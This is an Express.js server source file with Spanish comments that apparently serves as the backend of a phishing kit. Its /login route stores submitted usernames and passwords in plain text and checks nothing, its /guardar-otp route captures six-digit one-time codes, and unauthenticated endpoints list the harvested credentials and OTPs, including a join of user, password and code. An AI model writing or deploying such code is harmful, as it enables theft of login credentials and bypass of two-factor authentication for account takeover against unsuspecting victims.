import express from 'express';
import bodyParser from 'body-parser';
import { connection as db } from './db.js';


const app = express();
const PORT = process.env.PORT || 3000;

// Servir archivos estáticos desde la carpeta "public"
app.use(express.static('public'));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('Public', { extensions: ['html'] }));
app.use(express.json());

app.post('/login', (req, res) => {
  const { usuario, clave } = req.body;

  //console.log('Datos recibidos en /login:', req.body);

  const query = 'INSERT INTO usuarios (usuario, clave) VALUES (?, ?)';
  db.query(query, [usuario, clave], (err) => {
  if (err) {
    //console.error('Error al insertar:', err.sqlMessage || err.message);
    return res.status(500).json({ error: err.sqlMessage || 'Error interno' });
  }
  res.send('Datos guardados correctamente');
  });
});
app.use(express.json());

app.post('/guardar-otp', (req, res) => {
  const { otp, usuario } = req.body;

  //console.log('OTP recibida:', otp);
  //console.log('Usuario recibido:', usuario);

  if (!otp || otp.length !== 6 || !usuario) {
    return res.status(400).send('Datos inválidos');
  }

  const query = 'INSERT INTO otps (otp, usuario) VALUES (?, ?)';
  db.query(query, [otp, usuario], (err) => {
    if (err) {
      //console.error('Error al guardar OTP:', err.sqlMessage || err.message);
      return res.status(500).send('Error al guardar OTP');
    }
    //console.log(`OTP guardada: ${otp} para usuario: ${usuario}`);
    //res.send('OTP y usuario almacenados correctamente');
  });
});

app.get('/ver-registros', (req, res) => {
  const query = 'SELECT * FROM otps ORDER BY id DESC LIMIT 50'; // puedes ajustar el límite

  db.query(query, (err, results) => {
    if (err) {
      console.error('Error al consultar registros:', err);
      return res.status(500).send('Error al consultar');
    }
    res.json(results);
  });
});

app.get('/ver-usuarios', (req, res) => {
  const query = 'SELECT * FROM usuarios ORDER BY id DESC';

  db.query(query, (err, results) => {
    if (err) {
      console.error('Error al consultar usuarios:', err);
      return res.status(500).send('Error al consultar usuarios');
    }
    res.json(results);
  });
});

app.get('/ver-consolidado', (req, res) => {
  const query = `
    SELECT o.otp, o.creado_en, u.usuario, u.clave
    FROM otps o
    JOIN usuarios u ON o.usuario = u.usuario
    ORDER BY o.id DESC
  `;
  db.query(query, (err, results) => {
    if (err) {
      console.error('Error al consultar consolidado:', err);
      return res.status(500).send('Error al consultar');
    }
    res.json(results);
  });
});


app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
